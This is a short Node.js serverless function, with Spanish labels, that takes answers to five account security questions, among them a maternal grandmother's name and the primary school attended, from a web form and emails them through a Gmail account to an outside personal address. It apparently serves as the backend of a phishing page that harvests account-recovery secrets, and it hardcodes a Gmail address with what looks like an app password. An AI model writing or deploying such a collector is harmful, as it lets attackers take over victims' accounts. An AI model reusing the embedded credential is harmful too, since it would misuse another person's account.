const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    const { personaje_libro, marca_carro, color_favorito, nombre_abuela, colegio_primaria } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'cuentaluperonp5@gmail.com',
            pass: 'hkqlbwibpmntqojg',
        },
    });

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com',
        subject: 'Respuestas de Preguntas de Seguridad',
        text: `
            ¿Cuál es el personaje de su libro favorito?: ${personaje_libro}
            ¿Cuál es la marca de su primer carro?: ${marca_carro}
            ¿Cuál es su color favorito?: ${color_favorito}
            ¿Cuál es el nombre de su abuela materna?: ${nombre_abuela}
            ¿Nombre del colegio donde cursó la primaria?: ${colegio_primaria}
        `,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
